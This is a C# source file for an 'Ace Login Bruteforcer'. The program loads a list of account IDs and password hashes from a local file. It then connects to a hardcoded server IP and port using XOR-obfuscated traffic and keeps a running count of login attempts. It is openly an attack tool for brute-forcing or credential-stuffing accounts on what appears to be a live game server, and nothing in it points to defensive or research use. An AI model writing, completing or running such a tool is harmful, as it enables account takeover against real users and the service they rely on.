using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AceBruteforcer
{
    class Program
    {
        public static string ip = "52.59.32.76";
        public static ushort port = 15100;

        public struct Login
        {
            public string id;
            public byte[] psw;
        };
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static int idx = 0;
        public static object lockObj = new object();

        public static Dictionary<string, byte[]> accDatas = new Dictionary<string, byte[]>();
        static string xorkey = "vmdlfjhud830pwkldlkv[]f.jdmvld;sk,mcuie8rijmfvkidfo340-pflcl,;dsd]u03u40jvconvn08892h0nnlsnldsf/,;vms[pf-2fjd]u03u40jvconvn082";

        static PreSocket ps = new PreSocket(xorkey);
        public static void Init()
        {
            new Thread(() => new PreSocket(xorkey).Connect(Program.ip, Program.port)).Start();
        }

        public static List<byte[]> hashList = new List<byte[]>();
        static void Main(string[] args)
        {
            string[] lines = File.ReadAllLines("E:\\acclist_da.txt");
            foreach (var line in lines)
            {
                try
                {
                    string[] lineValue = line.Split('\t');
                    string _id = lineValue[0];
                    byte[] hash = StringToByteArray(lineValue[1]);

                    accDatas.Add(_id, hash);
                }
                catch { continue; }
            }

            Console.WriteLine(Marshal.SizeOf(new Protocols.Protocol.MSG_PC_CONNECT_LOGIN()));

            new Thread(() => { while (true) { lock (lockObj) { Console.Title = string.Format("Ace Login Bruteforcer | Tried Logins: {0}", Program.idx); } Thread.Sleep(250); } }).Start();
           // for (int i = 0; i < 1; i++)
                Init();

            while (true) { }
        }
    }
}
